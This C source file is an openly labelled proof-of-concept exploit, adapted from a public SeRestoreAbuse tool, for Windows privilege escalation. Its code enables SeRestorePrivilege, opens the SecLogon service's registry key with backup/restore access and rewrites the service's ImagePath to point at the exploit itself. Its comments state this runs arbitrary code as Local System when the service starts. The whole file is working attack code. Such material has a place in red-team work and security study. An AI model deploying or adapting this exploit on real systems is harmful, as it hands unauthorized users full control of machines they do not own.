/**

    @file      SeRestoreAbuse.c
    @author    @rhymenaucerous
	@brief     This is a modified version of the original SeRestoreAbuse PoC
               by @xct_de. The original code can be found here:
               https://github.com/xct/SeRestoreAbuse

    Exploit SeRestorePrivilege by modifying Seclogon ImagePath
    Author: @xct_de

**/

// Standard C includes
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <stdio.h>

// Header includes
#include "SeRestoreAbuse.h"

// ############################## Enums ##############################

#define SECLOGON_REG_KEY L"SYSTEM\\CurrentControlSet\\Services\\SecLogon"

typedef enum
{
    STATUS_SUCCESS = 0,   // Operation successful
    STATUS_INVALID_PARAM = 1,   // Invalid parameter passed
    STATUS_MEMORY_ALLOCATION = 2,   // Memory allocation failure
    STATUS_ERR_GENERIC = 100, // Generic error
} STATUS;

// ############################# Fn Declarations #############################

/**
    @brief  Sets the ImagePath value of the Seclogon service to point to this
            executable. This allows an attacker with SeRestorePrivilege to
execute arbitrary code in the context of the Local System account when the
Seclogon service starts.
    @retval  - STATUS_SUCCESS on success
             - STATUS_ERR_GENERIC on failure
**/
static STATUS SetSelfAsRegKey();

/**
    @brief  Sets or unsets a privilege for the current process token.
    @param  hToken           - Handle to the process token.
    @param  pPrivilegeName   - Name of the privilege to set or unset (e.g.,
                               SE_RESTORE_NAME).
    @param  bEnablePrivilege - TRUE to enable the privilege, FALSE to disable
it.
    @retval                  - STATUS_SUCCESS on success, STATUS_ERR_GENERIC on
failure.
**/
static STATUS SetPrivilege(HANDLE hToken,
                           PWCHAR pPrivilegeName,
                           BOOL   bEnablePrivilege);

// ############################## Fn Definitions ##############################

INT
wmain (INT iArgc, PWCHAR *ppArgv)
{
    UNREFERENCED_PARAMETER(iArgc);
    UNREFERENCED_PARAMETER(ppArgv);

    STATUS Status = STATUS_ERR_GENERIC;

    Status = SetSelfAsRegKey();
    if (STATUS_SUCCESS != Status)
    {
        PRINT_ERROR("SetSelfAsRegKey failed");
        goto EXIT;
    }

    Status = STATUS_SUCCESS;
EXIT:
    return Status;
} // wmain

static STATUS
SetSelfAsRegKey()
{
    STATUS           Status              = STATUS_ERR_GENERIC;
    BOOL             bStatus             = FALSE;
    LONG             lStatus             = 1; // non-zero to indicate failure
    WCHAR            szExePath[MAX_PATH] = { 0 };
    HANDLE           hProcess            = NULL;
    HANDLE           hToken              = NULL;
    HKEY             hKey                = NULL;

    // Get path to this executable
    if (0 == GetModuleFileNameW(NULL, szExePath, MAX_PATH))
    {
        PRINT_ERROR("GetModuleFileNameW failed");
        goto EXIT;
    }

    //Testing
    wprintf(L"DEBUG: Executable path: %s\n", szExePath);

    hProcess = GetCurrentProcess();
    if (NULL == hProcess)
    {
        PRINT_ERROR("GetCurrentProcess failed");
        goto EXIT;
    }

    bStatus = OpenProcessToken(
        hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
    if (FALSE == bStatus)
    {
        PRINT_ERROR("OpenProcessToken failed");
        goto EXIT;
    }

    Status = SetPrivilege(hToken, SE_RESTORE_NAME, TRUE);
    if (STATUS_SUCCESS != Status)
    {
        PRINT_ERROR("SetPrivilege failed");
        goto EXIT;
    }

    lStatus = RegCreateKeyExW(HKEY_LOCAL_MACHINE,
                              SECLOGON_REG_KEY,
                              0,                         // Reserved
                              NULL,                      // Class
                              REG_OPTION_BACKUP_RESTORE, // Options
                              KEY_SET_VALUE,             // Desired access
                              NULL,                      // Security attributes
                              &hKey,                     // Resulting key handle
                              NULL);                     // Disposition
    if (ERROR_SUCCESS != lStatus)
    {
        PRINT_ERROR("RegCreateKeyExW failed");
        goto EXIT;
    }

    lStatus = RegSetValueExW(hKey,
                             L"ImagePath",
                             0,      // Reserved
                             REG_SZ, // Type
                             (PBYTE)szExePath,
                             sizeof(szExePath));
    if (ERROR_SUCCESS != lStatus)
    {
        PRINT_ERROR("RegSetValueExW failed");
        goto EXIT;
    }

    Status = STATUS_SUCCESS;
EXIT:
    return Status;
} // SetSelfAsRegKey

static STATUS
SetPrivilege (HANDLE hToken, PWCHAR pPrivilegeName, BOOL bEnablePrivilege)
{
    STATUS      Status  = STATUS_ERR_GENERIC;
    TOKEN_PRIVILEGES tp      = { 0 };
    LUID             luid    = { 0 };
    BOOL             bStatus = FALSE;

    // Set privileges on the local system
    bStatus = LookupPrivilegeValueW(NULL, pPrivilegeName, &luid);
    if (FALSE == bStatus)
    {
        PRINT_ERROR("LookupPrivilegeValueW failed");
        goto EXIT;
    }

    tp.PrivilegeCount     = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege)
    {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    }
    else
    {
        tp.Privileges[0].Attributes = 0;
    }

    bStatus = AdjustTokenPrivileges(
        hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if (FALSE == bStatus)
    {
        PRINT_ERROR("AdjustTokenPrivileges failed");
        goto EXIT;
    }

    Status = STATUS_SUCCESS;
EXIT:
    return Status;
} // SetPrivilege

//End of file
